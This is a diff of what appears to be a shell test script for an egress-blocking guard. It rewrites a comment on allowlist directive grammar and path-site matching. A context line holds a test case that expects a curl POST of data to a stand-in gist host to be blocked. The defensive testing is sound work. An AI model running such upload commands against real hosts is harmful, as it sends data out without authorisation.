@@ -1348,15 +1348,19 @@ else
     "$E007_D_R" enforce 'curl -X POST https://gist.example.test/u -d x' 2 1 0 'BLOCK-EGRESS-004'
 
   # ---- the directive grammar and the path-site guard, clause by clause ----
-  # The allowlist header states three clauses no arm above pins. A directive is
-  # DISCARDED by any other line in its row's position — a blank, a comment, another
-  # directive — so a scope never carries onto a later row. Its value is TRIMMED of
-  # surrounding whitespace. And at the gh-api path site, a first segment carrying `*`,
-  # `?` or `[` is never a candidate, including behind one leading `/` and whatever the
-  # row's directive says. The behaviour is correct at the tip; these arms make a
-  # regression in any clause turn red. They port the Stage-7 reviewer's adversarial arms
-  # for these classes: ADV-G1, G2, G3a/b, G4/G4b, G5 and G10 (the grammar), and ADV-P1,
-  # P2, P3/P3c and P5/P5c (the guard, each with a live-row control).
+  # Three behaviours no arm above pins: two clauses the allowlist header states, and one
+  # leniency of the matcher that the header does not state. A directive is DISCARDED by
+  # any other line in its row's position — a blank, a comment, another directive — so a
+  # scope never carries onto a later row. At the gh-api path site, a first segment
+  # carrying `*`, `?` or `[` is never a candidate, including behind one leading `/` and
+  # whatever the row's directive says. And the matcher, is_allowlisted, TRIMS surrounding
+  # whitespace from a directive's value, although the header describes a directive as a
+  # line reading exactly `# egress-scope: host` or `# egress-scope: gh-api-path` — that
+  # leniency is the matcher's, not a header clause (the divergence Stage 8 recorded as
+  # S8-F3, which the operator accepted). The behaviour is correct at the tip; these arms
+  # make a regression in any of the three turn red. They port the Stage-7 reviewer's
+  # adversarial arms for these classes: ADV-G1, G2, G3a/b, G4/G4b, G5 and G10 (the
+  # grammar), and ADV-P1, P2, P3/P3c and P5/P5c (the guard, each with a live-row control).
   #
   # Every grammar row is probed in BOTH domains, as a curl upload host and as a gh api
   # write path, so the four states a row can be in stay distinguishable rather than
